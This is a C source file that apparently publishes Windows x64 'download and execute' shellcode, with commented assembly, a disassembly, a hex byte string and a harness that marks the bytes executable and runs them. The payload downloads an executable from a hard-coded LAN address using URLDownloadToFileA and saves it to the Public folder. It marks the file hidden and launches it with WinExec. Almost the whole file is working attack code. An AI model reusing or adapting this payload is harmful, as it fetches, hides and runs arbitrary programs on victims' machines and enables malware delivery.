/*

	# Title : Windows x64 Download+Execute Shellcode
	# Author : Roziul Hasan Khan Shifat
	# Date : 24-11-2016
	# size : 358 bytes
	# Tested on : Windows 7 x64 Professional
	# Email : shifath12@gmail.com




*/




/*


section .text
	global _start
_start:


;-----------------------------

sub rsp,88

lea r14,[rsp]
sub rsp,88


;------------------------------------------------


xor rdx,rdx
mov rax,[gs:rdx+0x60] ;PEB
mov rsi,[rax+0x18] ;PEB.Ldr
mov rsi,[rsi+0x10] ;PEB.Ldr->InMemOrderModuleList
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30] ;kernel32.dll base address

;---------------------------------------------------


mov ebx,[rdi+0x3c] ;elf_anew
add rbx,rdi
mov dl,0x88
mov ebx,[rbx+rdx]
add rbx,rdi

mov esi,[rbx+0x1c]
add rsi,rdi
;--------------------------------------------------

;loading urlmon.dll

mov dx,831
mov ebx,[rsi+rdx*4]
add rbx,rdi

xor rdx,rdx


mov [r14],dword 'urlm'
mov [r14+4],word 'on'
mov [r14+6],byte dl

lea rcx,[r14]



call rbx


mov dx,586
mov ebx,[rsi+rdx*4]
add rbx,rdi

xor rdx,rdx

mov rcx,'URLDownl'
mov [r14],rcx
mov rcx,'oadToFil'
mov [r14+8],rcx
mov [r14+16],word 'eA'
mov [r14+18],byte dl


lea rdx,[r14]
mov rcx,rax

call rbx
;;;;;;;;;;;;;;;;;;;;;;-------------------------------------

mov r15,rax

;------------------------------------------------
;save as 'C:\\Users\\Public\\p.exe' length: 24+1

mov rax,'C:\\User'
mov [r14],rax
mov rax,'s\\Publi'
mov [r14+8],rax
mov rax,'c\\p.exe'
mov [r14+16],rax

xor rdx,rdx
mov [r14+24],byte dl


;----------------------------------------


lea rcx,[r14+25]


;url "http://192.168.10.129/pl.exe" length: 28+1

mov rax,'http://1'
mov [rcx],rax
mov rax,'92.168.1'
mov [rcx+8],rax
mov rax,'0.129/pl'
mov [rcx+16],rax
mov [rcx+24],dword '.exe'
mov [rcx+28],byte dl


;---------------------------------------------------

sub rsp,88


download:
xor rcx,rcx
lea rdx,[r14+25]
lea r8,[r14]
xor r9,r9
mov [rsp+32],r9

call r15

xor rdx,rdx
cmp rax,rdx
jnz download



;------------------------------------------------
sub rsp,88
;-----------------------------------------------
;hiding file




mov dx,1131
mov ebx,[rsi+rdx*4]
add rbx,rdi ;SetFileAttributesA()


lea rcx,[r14]
xor rdx,rdx
mov dl,2

call rbx

;------------------------------------
;executing file
xor rdx,rdx
mov dx,1314
mov ebx,[rsi+rdx*4]
add rbx,rdi ;WinExec()


lea rcx,[r14]

xor rdx,rdx



call rbx


;------------------------------
xor rdx,rdx
mov dx,296
mov ebx,[rsi+rdx*4]
add rbx,rdi

;---------------------------------------

;if U use this shellcode for pe injection, then don't forget to free allocated space

add rsp,88
xor rcx,rcx
call rbx


*/

/*


Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 83 ec 58          	sub    $0x58,%rsp
   4:	4c 8d 34 24          	lea    (%rsp),%r14
   8:	48 83 ec 58          	sub    $0x58,%rsp
   c:	48 31 d2             	xor    %rdx,%rdx
   f:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
  14:	48 8b 70 18          	mov    0x18(%rax),%rsi
  18:	48 8b 76 10          	mov    0x10(%rsi),%rsi
  1c:	48 ad                	lods   %ds:(%rsi),%rax
  1e:	48 8b 30             	mov    (%rax),%rsi
  21:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
  25:	8b 5f 3c             	mov    0x3c(%rdi),%ebx
  28:	48 01 fb             	add    %rdi,%rbx
  2b:	b2 88                	mov    $0x88,%dl
  2d:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  30:	48 01 fb             	add    %rdi,%rbx
  33:	8b 73 1c             	mov    0x1c(%rbx),%esi
  36:	48 01 fe             	add    %rdi,%rsi
  39:	66 ba 3f 03          	mov    $0x33f,%dx
  3d:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
  40:	48 01 fb             	add    %rdi,%rbx
  43:	48 31 d2             	xor    %rdx,%rdx
  46:	41 c7 06 75 72 6c 6d 	movl   $0x6d6c7275,(%r14)
  4d:	66 41 c7 46 04 6f 6e 	movw   $0x6e6f,0x4(%r14)
  54:	41 88 56 06          	mov    %dl,0x6(%r14)
  58:	49 8d 0e             	lea    (%r14),%rcx
  5b:	ff d3                	callq  *%rbx
  5d:	66 ba 4a 02          	mov    $0x24a,%dx
  61:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
  64:	48 01 fb             	add    %rdi,%rbx
  67:	48 31 d2             	xor    %rdx,%rdx
  6a:	48 b9 55 52 4c 44 6f 	movabs $0x6c6e776f444c5255,%rcx
  71:	77 6e 6c
  74:	49 89 0e             	mov    %rcx,(%r14)
  77:	48 b9 6f 61 64 54 6f 	movabs $0x6c69466f5464616f,%rcx
  7e:	46 69 6c
  81:	49 89 4e 08          	mov    %rcx,0x8(%r14)
  85:	66 41 c7 46 10 65 41 	movw   $0x4165,0x10(%r14)
  8c:	41 88 56 12          	mov    %dl,0x12(%r14)
  90:	49 8d 16             	lea    (%r14),%rdx
  93:	48 89 c1             	mov    %rax,%rcx
  96:	ff d3                	callq  *%rbx
  98:	49 89 c7             	mov    %rax,%r15
  9b:	48 b8 43 3a 5c 5c 55 	movabs $0x726573555c5c3a43,%rax
  a2:	73 65 72
  a5:	49 89 06             	mov    %rax,(%r14)
  a8:	48 b8 73 5c 5c 50 75 	movabs $0x696c6275505c5c73,%rax
  af:	62 6c 69
  b2:	49 89 46 08          	mov    %rax,0x8(%r14)
  b6:	48 b8 63 5c 5c 70 2e 	movabs $0x6578652e705c5c63,%rax
  bd:	65 78 65
  c0:	49 89 46 10          	mov    %rax,0x10(%r14)
  c4:	48 31 d2             	xor    %rdx,%rdx
  c7:	41 88 56 18          	mov    %dl,0x18(%r14)
  cb:	49 8d 4e 19          	lea    0x19(%r14),%rcx
  cf:	48 b8 68 74 74 70 3a 	movabs $0x312f2f3a70747468,%rax
  d6:	2f 2f 31
  d9:	48 89 01             	mov    %rax,(%rcx)
  dc:	48 b8 39 32 2e 31 36 	movabs $0x312e3836312e3239,%rax
  e3:	38 2e 31
  e6:	48 89 41 08          	mov    %rax,0x8(%rcx)
  ea:	48 b8 30 2e 31 32 39 	movabs $0x6c702f3932312e30,%rax
  f1:	2f 70 6c
  f4:	48 89 41 10          	mov    %rax,0x10(%rcx)
  f8:	c7 41 18 2e 65 78 65 	movl   $0x6578652e,0x18(%rcx)
  ff:	88 51 1c             	mov    %dl,0x1c(%rcx)
 102:	48 83 ec 58          	sub    $0x58,%rsp

0000000000000106 <download>:
 106:	48 31 c9             	xor    %rcx,%rcx
 109:	49 8d 56 19          	lea    0x19(%r14),%rdx
 10d:	4d 8d 06             	lea    (%r14),%r8
 110:	4d 31 c9             	xor    %r9,%r9
 113:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
 118:	41 ff d7             	callq  *%r15
 11b:	48 31 d2             	xor    %rdx,%rdx
 11e:	48 39 d0             	cmp    %rdx,%rax
 121:	75 e3                	jne    106 <download>
 123:	48 83 ec 58          	sub    $0x58,%rsp
 127:	66 ba 6b 04          	mov    $0x46b,%dx
 12b:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 12e:	48 01 fb             	add    %rdi,%rbx
 131:	49 8d 0e             	lea    (%r14),%rcx
 134:	48 31 d2             	xor    %rdx,%rdx
 137:	b2 02                	mov    $0x2,%dl
 139:	ff d3                	callq  *%rbx
 13b:	48 31 d2             	xor    %rdx,%rdx
 13e:	66 ba 22 05          	mov    $0x522,%dx
 142:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 145:	48 01 fb             	add    %rdi,%rbx
 148:	49 8d 0e             	lea    (%r14),%rcx
 14b:	48 31 d2             	xor    %rdx,%rdx
 14e:	ff d3                	callq  *%rbx
 150:	48 31 d2             	xor    %rdx,%rdx
 153:	66 ba 28 01          	mov    $0x128,%dx
 157:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 15a:	48 01 fb             	add    %rdi,%rbx
 15d:	48 83 c4 58          	add    $0x58,%rsp
 161:	48 31 c9             	xor    %rcx,%rcx
 164:	ff d3                	callq  *%rbx

*/

#include<windows.h>
#include<stdio.h>
#include<string.h>


char shellcode[]=\

"\x48\x83\xec\x58\x4c\x8d\x34\x24\x48\x83\xec\x58\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x8b\x5f\x3c\x48\x01\xfb\xb2\x88\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x66\xba\x3f\x03\x8b\x1c\x96\x48\x01\xfb\x48\x31\xd2\x41\xc7\x06\x75\x72\x6c\x6d\x66\x41\xc7\x46\x04\x6f\x6e\x41\x88\x56\x06\x49\x8d\x0e\xff\xd3\x66\xba\x4a\x02\x8b\x1c\x96\x48\x01\xfb\x48\x31\xd2\x48\xb9\x55\x52\x4c\x44\x6f\x77\x6e\x6c\x49\x89\x0e\x48\xb9\x6f\x61\x64\x54\x6f\x46\x69\x6c\x49\x89\x4e\x08\x66\x41\xc7\x46\x10\x65\x41\x41\x88\x56\x12\x49\x8d\x16\x48\x89\xc1\xff\xd3\x49\x89\xc7\x48\xb8\x43\x3a\x5c\x5c\x55\x73\x65\x72\x49\x89\x06\x48\xb8\x73\x5c\x5c\x50\x75\x62\x6c\x69\x49\x89\x46\x08\x48\xb8\x63\x5c\x5c\x70\x2e\x65\x78\x65\x49\x89\x46\x10\x48\x31\xd2\x41\x88\x56\x18\x49\x8d\x4e\x19\x48\xb8\x68\x74\x74\x70\x3a\x2f\x2f\x31\x48\x89\x01\x48\xb8\x39\x32\x2e\x31\x36\x38\x2e\x31\x48\x89\x41\x08\x48\xb8\x30\x2e\x31\x32\x39\x2f\x70\x6c\x48\x89\x41\x10\xc7\x41\x18\x2e\x65\x78\x65\x88\x51\x1c\x48\x83\xec\x58\x48\x31\xc9\x49\x8d\x56\x19\x4d\x8d\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x41\xff\xd7\x48\x31\xd2\x48\x39\xd0\x75\xe3\x48\x83\xec\x58\x66\xba\x6b\x04\x8b\x1c\x96\x48\x01\xfb\x49\x8d\x0e\x48\x31\xd2\xb2\x02\xff\xd3\x48\x31\xd2\x66\xba\x22\x05\x8b\x1c\x96\x48\x01\xfb\x49\x8d\x0e\x48\x31\xd2\xff\xd3\x48\x31\xd2\x66\xba\x28\x01\x8b\x1c\x96\x48\x01\xfb\x48\x83\xc4\x58\x48\x31\xc9\xff\xd3";

int main()
{
int len=strlen(shellcode);
DWORD l=0;
printf("shellcode length : %d\n",len);
VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
(* (int(*)()) shellcode)();

return 0;

}